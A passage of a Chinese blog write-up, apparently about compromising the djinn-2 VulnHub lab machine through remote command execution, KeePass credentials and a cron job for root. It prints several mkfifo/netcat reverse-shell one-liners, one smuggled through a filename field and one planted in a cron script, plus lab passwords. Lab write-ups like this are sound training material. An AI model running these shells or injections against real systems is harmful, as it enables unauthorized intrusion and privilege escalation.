&amp;&amp; /tmp/tmp.sh&#x27;</span>&#125;</span><br><span class="line">		url = <span class="string">&quot;http://&quot;</span> + target_address</span><br><span class="line">		r = requests.post(url, params = params)</span><br><span class="line">		<span class="built_in">print</span> r.text</span><br><span class="line">		</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
+
+<p>直接执行</p>
+<p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114155923707.png" alt="image-20210114155923707"></p>
+<p>啊！这！直接？？？就获取shell了？？orz<img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/2E2543EC.gif" alt="img"></p>
+<p>我仔细琢磨一番，啊~是这样啊，$是每次执行命令都会出现的符号而已，实际还在执行这个py文件，只是看起来好看了，那再输入反弹语句，弹出来的才是真正意思上的shell环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/foo;cat /tmp/foo | /bin/bash -i 2&gt;&amp;1 | nc 192.168.56.123 8888&gt;/tmp/foo</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里又是很奇怪的一点，用常规的mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.56.123 8888 &gt;/tmp/f是不行的，嘿！这咋回事，不接受f只接受foo吗？我试了好几次，换成fow，就行，OK知道了，f这个文件原本是存在的，没有rm /tmp/f;结果呢，怎么都删不掉，一看是root创建的，我确实删不掉，那就换文件名为其他的就行了，目的不就是为了弹shell吗，其实我觉得这样的状态下，好用就行了，弹不弹的看个人喜好吧</p>
+</blockquote>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>   <span class="comment"># python不能用，试试python3</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="查找文件"><a href="#查找文件" class="headerlink" title="查找文件"></a>查找文件</h3><blockquote>
+<p>由于这是一家公司，查找思路是/var/下有没有backup，还有/var下的mail邮箱信息</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var</span><br><span class="line">ls -la</span><br><span class="line"><span class="built_in">cd</span> backups</span><br><span class="line">ls -la</span><br><span class="line"><span class="built_in">cd</span> /var/mail</span><br><span class="line">ls -la /var/mail/*</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114142305078.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114142305078.png" alt="image-20210114142305078"></a></p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114125352088.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114125352088.png" alt="image-20210114125352088"></a></p>
+<p>看到了nitu，想起了那个ftp服务器下的三个txt文件，其中creds.txt里面就有这个nitu</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nitu:7846A$56</span><br></pre></td></tr></table></figure>
+
+<p>猜测是什么地方的密码</p>
+<h3 id="KeePass2"><a href="#KeePass2" class="headerlink" title="KeePass2"></a>KeePass2</h3><p>再看这个nitu.kdbx文件是隶属于nitish用户的，那kdbx又是什么文件呢</p>
+<blockquote>
+<p>什么是KDBX文件？</p>
+<p>由Windows免费密码管理器KeePass Password Safe创建的文件； </p>
+<p>存储密码的加密数据库，该数据库只能使用用户设置的主密码进行查看； </p>
+<p>用于安全存储Windows，电子邮件帐户，FTP站点，电子商务站点和其他目的的个人登录凭据。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114130447916.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114130447916.png" alt="image-20210114130447916"></a></p>
+<p>下载链接在：<a target="_blank" rel="noopener" href="https://m33.wiki/extension/kdbx.html">打开KDBX文件的程序</a></p>
+<p>有了可以打开kdbx文件的软件，就可以打开看了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server   <span class="comment"># python3共享文件的方式</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114130842669.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114130842669.png" alt="image-20210114130842669"></a></p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114131022995.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114131022995.png" alt="image-20210114131022995"></a></p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114131150694.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114131150694.png" alt="image-20210114131150694"></a></p>
+<p>鼠标右键copy password</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114131511751.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114131511751.png" alt="image-20210114131511751"></a></p>
+<p>竟然！12秒之后就会清空你的粘贴板，赶紧粘贴，看到了密码是 <code>&amp;HtMGd$LJB</code></p>
+<p>意味着可以su nitish 回想起22端口开放着，是不是能直接登录了呢</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114131854850.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114131854850.png" alt="image-20210114131854850"></a></p>
+<p>呦西！可以！这下提权方便多了，看到了lxd用户组，这个之前提权过</p>
+<p>这里先不提</p>
+<p>继续找，找一下当前开放的进程和端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ant</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114133334857.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114133334857.png" alt="image-20210114133334857"></a></p>
+<p>32984是与kali反弹shell自动开放的端口</p>
+<p>那么25、6010、2843是什么，25是MSTP邮件服务器，其他不知道，那就nc连接看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.56.109 2843</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114135949043.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114135949043.png" alt="image-20210114135949043"></a></p>
+<blockquote>
+<p>这个小游戏，研究了一会，发现5和6具有联动效应，5添加一个note名称，6会列出所有的note，由我选择查看哪一个，比如文件名为/etc/passwd，选择的时候会自动执行cat “文件名”</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114140743860.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114140743860.png" alt="image-20210114140743860"></a></p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114140937128.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114140937128.png" alt="image-20210114140937128"></a></p>
+<p>当前用户不是nitish 而是ugtan，利用这个机制，再来反弹一个shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.123 1111 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114141817733.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114141817733.png" alt="image-20210114141817733"></a></p>
+<blockquote>
+<p>输入文件名的时候，前面要先拼接一个目录，随便什么都可以，然后分号结束，再执行下一个命令</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114142016256.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114142016256.png" alt="image-20210114142016256"></a></p>
+</blockquote>
+<h3 id="定时任务提权"><a href="#定时任务提权" class="headerlink" title="定时任务提权"></a>定时任务提权</h3><p>现在是ugtan用户了，想起了前面查找文件<code>/var/mail/ugtan</code>是只能ugtan查看的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">From root@djinn  Mon Jan 13 19:36:24 2020</span><br><span class="line">Return-Path: &lt;root@djinn&gt;</span><br><span class="line">X-Original-To: ugtan@djinn</span><br><span class="line">Delivered-To: ugtan@djinn</span><br><span class="line">Received: by djinn (Postfix, from userid 0)</span><br><span class="line">        id E2B7C82E9F; Mon, 13 Jan 2020 19:36:24 +0530 (IST)</span><br><span class="line">Subject: Way to clean up the systems</span><br><span class="line">To: &lt;ugtan@djinn&gt;</span><br><span class="line">X-Mailer: mail (GNU Mailutils 3.4)</span><br><span class="line">Message-Id: &lt;20200113140624.E2B7C82E9F@djinn&gt;</span><br><span class="line">Date: Mon, 13 Jan 2020 19:36:24 +0530 (IST)</span><br><span class="line">From: root &lt;root@djinn&gt;</span><br><span class="line"></span><br><span class="line">Hey 0xmzfr,</span><br><span class="line">I<span class="string">&#x27;ve setup the folder that you asked me to make in my home directory,</span></span><br><span class="line"><span class="string">Since I&#x27;</span>d be gone <span class="keyword">for</span> a day or two you can just leave the clean.sh <span class="keyword">in</span></span><br><span class="line">that directory and cronjob will handle the rest. </span><br><span class="line"></span><br><span class="line">- Ugtan_</span><br></pre></td></tr></table></figure>
+
+<p>这封邮件的内容，阿嘞嘞，上翻译！</p>
+<blockquote>
+<p>我已经在我的主目录中设置了您要创建的文件夹， 由于我要离开一两天，所以您只需将<code>clean.sh</code>留在该目录然后cronjob将处理其余部分。</p>
+</blockquote>
+<p>Oh~ 那不就是在<code>/home/ugtan/best/admin/ever</code>下新建<code>clean.sh</code>，然后定时器会自动执行的意思吗</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.123 2222 &gt;/tmp/f&#x27;</span> &gt; clean.sh</span><br></pre></td></tr></table></figure>
+
+<p>然后等待定时任务的执行，不知道几分钟，等就是了</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114144010259.png"><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210114144010259.png" alt="image-20210114144010259"></a></p>
+<blockquote>
+<p>监听2222端口，弹回root的shell，因为是root权限自动执行的定时任务，不是ugtan执行的。</p>
+</blockquote>
+<p>到这大概就结束了，从/root下也查看到了proof.sh这个flag文件</p>
+<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><ul>
+<li>这次靶机获取了好几个用户的权限，这种层层攻破最终获取root权限的过程叫做<code>跳板用户提权</code></li>
+<li>获取到的新知识也是关键的一个文件：<code>kdbx文件</code> 下载KeePass2才能通过密码读取到的文件，获取到了nitish用户的密码，才能进入后续的提权操作</li>
+<li>这次渗透利用的关键是两处RCE，第一个是POST提交的username参数处，第二个是小游戏中note文件名是cat&lt;文件名&gt;漏洞</li>
+<li><code>curl -X</code> 指定http请求方式的命令可以替换burp</li>
+<li>python3共享文件的方法：<code>python3 -m http.server</code></li>
+<li>定时文件执行也可以获取到最高权限</li>
+<li>RCE漏洞或远程文件包含漏洞有一个通用的<code>msf</code>利用模块<code>web_delivery</code></li>
+<li>这个第二种python脚本getshell的方式，真的厉害，参考链接3的文章才知道的orz，我也想这么牛</li>
+<li>lxd提权那里，后面我又试了一下，确实是root了，但是id的时候没有用户组，用户组不在root里面，玩呢？也不知道问题是出在哪了–</li>
+</ul>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>1、<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43784056/article/details/107008701">https://blog.csdn.net/weixin_43784056/article/details/107008701</a></p>
+<p>2、<a target="_blank" rel="noopener" href="https://www.programmersought.com/article/28434657542/">https://www.programmersought.com/article/28434657542/</a></p>
+<p>3、<a target="_blank" rel="noopener" href="http://andreaukk.altervista.org/djinn-2-writeup-vulnhub/?doing_wp_cron=1610527850.3320260047912597656250">http://andreaukk.altervista.org/djinn-2-writeup-vulnhub/?doing_wp_cron=1610527850.3320260047912597656250</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">dummersoul</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://dummersoul.github.io/2023/11/28/djinn-2%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/">https://dummersoul.github.io/2023/11/28/djinn-2靶机练习/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://dummersoul.github.io" target="_blank">dummersoul's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%B6%E6%9C%BA/">靶机</a><a class="post-meta__tags" href="/tags/vulnhub/">vulnhub</a><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83/">内网提权</a></div><div class="post_share"><div class="social-share" data-image="/img/keepass.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/11/28/djinn-1%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/"><img class="prev-cover" src="/img/djinn1.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">djinn-1靶机练习</div></div></a></div><div class="next-post pull-right"><a href="/2023/11/28/Cysec1%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/"><img class="next-cover" src="/img/vulnhub.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Cysec1靶机练习</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/11/28/KB-VULN1靶机练习/" title="KB-VULN：1靶机练习"><img class="cover" src="/img/vulnhub.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-28</div><div class="title">KB-VULN：1靶机练习</div></div></a></div><div><a href="/2023/11/28/KB-VULN2靶机练习/" title="KB-VULN：2靶机练习"><img class="cover" src="/img/vulnhub.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-28</div><div class="title">KB-VULN：2靶机练习</div></div></a></div><div><a href="/2023/11/28/billu b0x_1靶机练习/" title="billu:b0x_1靶机练习"><img class="cover" src="/img/luffy_shanks.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-28</div><div class="title">billu:b0x_1靶机练习</div></div></a></div><div><a href="/2023/11/28/billu b0x_2靶机练习/" title="billu:b0x_2靶机练习"><img class="cover" src="/img/drupal.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-28</div><div class="title">billu:b0x_2靶机练习</div></div></a></div><div><a href="/2023/11/28/djinn-1靶机练习/" title="djinn-1靶机练习"><img class="cover" src="/img/djinn1.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-28</div><div class="title">djinn-1靶机练习</div></div></a></div><div><a href="/2023/11/28/vulnhub djinn3/" title="vulnhub djinn-3 writeup"><img class="cover" src="/img/Werkzeug.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-28</div><div class="title">vulnhub djinn-3 writeup</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/dummersoul.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">dummersoul</div><div class="author-info__description">网络安全从业者</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">34</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/dummersoul"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/dummersoul" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:dummersoul@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fa fa-rss"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">欢迎来到dummersoul的技术小窝</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.</span> <span class="toc-text">端口探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">3.</span> <span class="toc-text">目录扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E6%9E%9A%E4%B8%BE"><span class="toc-number">4.</span> <span class="toc-text">网页枚举</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#curl-X"><span class="toc-number">5.</span> <span class="toc-text">curl -X</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE-getshell"><span class="toc-number">6.</span> <span class="toc-text">RCE getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%80%EF%BC%9Amsf%E2%80%94%E2%80%94web-delivery"><span class="toc-number">6.1.</span> <span class="toc-text">法一：msf——web_delivery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9Apy%E8%84%9A%E6%9C%AC"><span class="toc-number">6.2.</span> <span class="toc-text">法二：py脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">7.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E6%96%87%E4%BB%B6"><span class="toc-number">7.1.</span> <span class="toc-text">查找文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KeePass2"><span class="toc-number">7.2.</span> <span class="toc-text">KeePass2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-number">7.3.</span> <span class="toc-text">定时任务提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%80%83%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">思考总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">9.</span> <span class="toc-text">参考文章</span></a></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/03/10/CVE-2021-42550%E5%A4%8D%E7%8E%B0/" title="CVE-2021-42550漏洞复现"><img src="https://techterms.com/img/sm/cve_1618.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2021-42550漏洞复现"/></a><div class="content"><a class="title" href="/2024/03/10/CVE-2021-42550%E5%A4%8D%E7%8E%B0/" title="CVE-2021-42550漏洞复现">CVE-2021-42550漏洞复现</a><time datetime="2024-03-10T06:54:43.353Z" title="发表于 2024-03-10 14:54:43">2024-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/10/webview%20%20intent%20uxss/" title="webview intent uxss"><img src="https://miro.medium.com/v2/resize:fit:828/format:webp/1*WwN78iOX-HC74T9AHGxjOg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="webview intent uxss"/></a><div class="content"><a class="title" href="/2024/03/10/webview%20%20intent%20uxss/" title="webview intent uxss">webview intent uxss</a><time datetime="2024-03-10T06:54:17.108Z" title="发表于 2024-03-10 14:54:17">2024-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/10/%E5%9F%BA%E4%BA%8ETomcat%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/" title="基于Tomcat的内存马分析"><img src="https://picx.zhimg.com/70/v2-fd69dc15d82e0d4b54cfba25e7e15443_1440w.avis?source=172ae18b&amp;biz_tag=Post" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="基于Tomcat的内存马分析"/></a><div class="content"><a class="title" href="/2024/03/10/%E5%9F%BA%E4%BA%8ETomcat%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/" title="基于Tomcat的内存马分析">基于Tomcat的内存马分析</a><time datetime="2024-03-10T06:53:39.202Z" title="发表于 2024-03-10 14:53:39">2024-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/10/Tomcat%E6%9E%B6%E6%9E%84/" title="Tomcat架构"><img src="https://images.ytao.top/tomcat.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Tomcat架构"/></a><div class="content"><a class="title" href="/2024/03/10/Tomcat%E6%9E%B6%E6%9E%84/" title="Tomcat架构">Tomcat架构</a><time datetime="2024-03-10T06:53:39.200Z" title="发表于 2024-03-10 14:53:39">2024-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/28/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82DEX%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/" title="一文搞懂DEX文件结构"><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20211201164619.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="一文搞懂DEX文件结构"/></a><div class="content"><a class="title" href="/2023/11/28/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82DEX%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/" title="一文搞懂DEX文件结构">一文搞懂DEX文件结构</a><time datetime="2023-11-28T08:48:58.520Z" title="发表于 2023-11-28 16:48:58">2023-11-28</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 <i id="heartbeat" class="fa fas fa-heartbeat"></i> dummersoul</div><div class="framework-info"><!--span= _p('footer.framework') + ' '--><!--a(href='https://hexo.io')= 'Hexo'--><!--span.footer-separator |--><!--span= _p('footer.theme') + ' '--><!--a(href='https://github.com/jerryc127/hexo-theme-butterfly')= 'Butterfly'--></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
+ <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(()=>{
+  let setting = {
+    appId: '',
+    appKey: '',
+  }
+
+  if (false) {
+    const otherSetting = false
+    setting = Object.assign({}, setting, otherSetting)
+  }
+
+  const init = () => {
+    new Artitalk(setting)
+  }
+
+  if (typeof Artitalk === 'function') {
+    init()
+  } else {
+    $.getScript('https://cdn.jsdelivr.net/npm/artitalk',init)
+  }
+})()</script><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: 'n3p3uLQDNt0AhK7HstJIX6hw-gzGzoHsz',
+      appKey: 'DzduWleTzfwsWV48PWO1wi1d',
+      placeholder: '留下你的昵称和邮箱，可以快速得到回复哦~',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: true,
+      serverURLs: '',
+      emojiCDN: '//i0.hdslb.com/bfs/emote/',
